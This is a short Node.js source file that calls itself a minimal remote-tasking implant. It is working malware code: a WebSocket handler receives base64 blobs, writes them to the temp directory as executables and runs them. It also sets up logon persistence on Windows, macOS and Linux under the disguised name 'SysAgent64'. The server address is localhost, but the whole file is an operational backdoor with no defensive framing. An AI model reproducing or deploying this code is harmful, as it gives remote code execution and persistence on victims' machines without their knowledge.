'use strict';
// Minimal remote-tasking implant shape: a WebSocket message handler that
// writes a delivered blob to disk as an executable and spawns it, plus
// autostart registration on Windows, macOS and Linux from the same file.
const { spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const WebSocket = require('ws');

const ws = new WebSocket('ws://127.0.0.1:18010');

ws.on('message', (raw) => {
  const task = JSON.parse(raw.toString());
  if (task.op === 'run') {
    const target = path.join(os.tmpdir(), task.name);
    fs.writeFileSync(target, Buffer.from(task.blob, 'base64'), { mode: 0o755 });
    spawn(target, task.args || []);
  }
});

function persist(agent) {
  if (process.platform === 'win32') {
    spawn('schtasks', ['/Create', '/SC', 'ONLOGON', '/TN', agent,
      '/TR', process.execPath, '/F']);
  } else if (process.platform === 'darwin') {
    const plist = path.join(os.homedir(), 'Library/LaunchAgents/' + agent + '.plist');
    spawn('launchctl', ['load', plist]);
  } else {
    spawn('systemctl', ['--user', 'enable', '--now', agent + '.service']);
  }
}

persist('SysAgent64');
